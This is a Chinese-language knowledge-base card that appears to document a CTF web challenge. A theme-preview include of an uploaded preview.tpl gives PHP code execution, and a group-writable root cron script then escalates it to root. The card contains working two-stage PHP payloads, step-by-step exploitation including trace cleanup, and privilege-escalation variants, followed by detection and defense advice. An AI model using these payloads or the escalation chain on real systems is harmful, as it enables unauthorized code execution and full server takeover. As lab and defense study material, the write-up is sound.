---
id: web-php-file-inclusion-theme-preview-tpl-rce-root-cron
title: 主题包预览 include preview.tpl 导致 PHP RCE；再利用 ctf 组可写的 root 维护脚本提权读 flag
type: scenario
domain: web
path: web/php/file-inclusion
technique: theme-preview-tpl-include-rce-group-writable-root-cron
tags:
- php
- file-inclusion
- file-upload
- theme
- rce
- privilege-escalation
- cron
- group-writable
- ctf
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V116
  verified_at: '2026-11-06T01:52:51+08:00'
  notes: 已对照原文 WEB2 一节核对：主题包 manifest.json/preview.tpl/assets/cover.png、白名单允许 .tpl、include $themePath.'/preview.tpl'、阶段 1 写 /var/lib/.ezz_upload/.maintenance/root-task.sh（root:ctf 组可写）、阶段 2 读 /tmp/ezz_flag 与 `id` 证明 uid=0(root)、ddddocr 验证码重试、flag 均一致。未验证点：PoC 未在本机复跑；frontmatter 无 sources/source_url。
url: /docs/web/php/file-inclusion/web-php-file-inclusion-theme-preview-tpl-rce-root-cron/
draft: false
kb_aliases:
- ezz_upload
- WEB2
- preview.tpl
- 主题包预览 RCE
- include 上传模板
- root-task.sh
- ctf 组可写 root cron
- 两阶段提权
---

## 一句话结论

ezz_upload 的主题包上传白名单允许 `.tpl`，预览时直接 `include $themePath . '/preview.tpl'`，把 PHP 代码写进 `preview.tpl` 即可在 Web 进程执行；拿到 `ctf` 用户 RCE 后，发现 `/var/lib/.ezz_upload/.maintenance/root-task.sh` 是 `root:ctf` 且组可写，root 周期执行该脚本，于是写入“读 /flag 到 /tmp”的脚本，等 root 任务跑完再读结果，完成从 Web RCE 到 root 的提权。

## 原理

- **上传白名单允许模板**：合法主题包结构为 `manifest.json`、`preview.tpl`、`assets/cover.png`；服务端白名单允许 `.tpl`，预览逻辑直接 `include $themePath . '/preview.tpl'`，没有把模板当纯文本渲染，而是当 PHP 脚本执行。
- **为什么 include 能执行**：PHP 的 `include` 会解析文件中的 `<?php ... ?>` 并执行；只要上传的 `preview.tpl` 含 PHP 标签，访问 `?action=preview&theme=<id>` 就会触发。上传目录在 Web 进程可写范围内，且预览路径由服务端拼接到已上传目录。
- **两阶段设计**：阶段 1 只写 root 维护脚本，不直接读 flag（`/flag` 仅 root 可读）；阶段 2 再上传一个只读脚本，读取 root 任务产生的 `/tmp/ezz_flag`、`/flag`、`/tmp/ezz_root_id` 等证据。
- **组可写 root 脚本**：`/var/lib/.ezz_upload/.maintenance/root-task.sh` 权限 `-rw-rw-r-- root ctf`，`ctf` 用户属于 `ctf` 组，因此可写；root 的 cron/systemd timer 周期执行该脚本，脚本内容以 root 身份运行，形成“低权用户改 root 脚本”的提权链。
- **验证**：脚本中写入 `id > /tmp/ezz_root_id`，阶段 2 读到 `uid=0(root) gid=0(root) groups=0(root)`，证明 root 执行；随后 `cat /flag` 或 `chmod 644 /flag` 读取 flag。
- **OCR 验证码**：上传入口有验证码，脚本用 `ddddocr` 自动识别，失败重试；这是自动化上传的工程细节，不是漏洞核心。

## 触发条件

- 应用允许上传主题包/插件包，白名单包含模板扩展名（`.tpl`/`.php` 等），预览/渲染时对上传文件执行 `include`/`require`。
- 上传目录对 Web 进程可写，且预览路径可由用户控制（theme id/文件名）。
- Web 进程以低权用户运行，但存在 root 周期任务执行组可写/全局可写的脚本。
- 攻击者能访问预览路由，且能等待/触发 root 定时任务。

## 利用步骤

1. 下载 demo 主题包，确认结构（`manifest.json`、`preview.tpl`、`assets/cover.png`）与上传/预览接口。
2. 构造主题包：`preview.tpl` 写入阶段 1 PHP，向 `/var/lib/.ezz_upload/.maintenance/root-task.sh` 写入读 flag/记录 root id 的 shell 脚本。
3. 上传并访问 `?action=preview&theme=<id>`，触发 `include`，阶段 1 执行并返回 `STAGE1_OK`。
4. 等待 root 定时任务执行（本题约 13 秒），root 脚本把 `/flag` 复制到 `/tmp/ezz_flag` 并 `chmod 644`，同时写 `id`/`date` 证据。
5. 上传阶段 2 主题包，`preview.tpl` 读取 `/tmp/ezz_flag`、`/flag`、`/tmp/ezz_root_id`，确认 root 执行并拿到 flag。
6. 清理上传文件/脚本（如有必要），避免留痕。

## PoC

阶段 1（写入 root 维护脚本）：

```php
<?php
$script = "#!/bin/sh\ncat /flag > /tmp/ezz_flag 2>/tmp/ezz_err\nchmod 644 /tmp/ezz_flag\nchmod 644 /flag\nid > /tmp/ezz_root_id 2>&1\ndate > /tmp/ezz_ran\n";
file_put_contents('/var/lib/.ezz_upload/.maintenance/root-task.sh', $script);
echo 'STAGE1_OK';
?>
```

阶段 2（读取结果）：

```php
<?php
echo shell_exec('ls -l /flag /tmp/ezz_flag /tmp/ezz_root_id /tmp/ezz_ran 2>&1; echo ---flag---; cat /flag 2>&1; echo ---tmpflag---; cat /tmp/ezz_flag 2>&1; echo ---rootid---; cat /tmp/ezz_root_id 2>&1');
?>
```

打包 `manifest.json` + `preview.tpl` + `assets/cover.png`，上传后访问预览路由。原文实测关键权限：

```text
-rw-rw-r-- 1 root ctf ... /var/lib/.ezz_upload/.maintenance/root-task.sh
uid=0(root) gid=0(root) groups=0(root)
```

未在本库复跑。

## 变体与关联

- **include 变体**：`include`/`require` 上传的 `.tpl`/`.php`/`.inc`；白名单只按扩展名，未禁止 PHP 标签。
- **提权变体**：root cron/systemd timer 执行组可写/全局可写脚本；`/etc/cron.d`、`/var/spool/cron`、`/etc/profile.d`、`authorized_keys`、`sudo` 配置等。
- **两阶段变体**：阶段 1 只写持久化/提权脚本，阶段 2 读取 root 产物；避免在低权阶段直接读 flag。
- **关联卡片**：[[web-php-file-inclusion-addon-manager-rewrite-marker-bypass]]（上传/包含相关）、[[web-generic-file-upload-zip-slip-webshell-write]]（上传写 webshell）、[[pentest-privilege-escalation-*]]（Linux 提权）。

## 检测与防御

- **上传/包含**：不要把用户上传的文件 `include` 执行；模板应使用沙箱化引擎/纯文本渲染；白名单按内容类型 + 真实路径校验，禁止上传可执行脚本。
- **目录权限**：维护脚本/定时任务目录不要对 Web 用户或低权组可写；cron/systemd 脚本使用 root-only 权限（0755/0700），校验完整性。
- **最小权限**：Web 进程使用独立低权用户，禁止属于可写 root 脚本的组；容器内移除不必要的 setuid/定时任务。
- **检测**：上传目录出现 `.tpl`/`.php` 且含 `<?php`；预览路由触发异常 `include`；root cron 脚本 mtime/内容变化；`/tmp` 出现 root 产物（`ezz_flag`、`ezz_root_id`）。
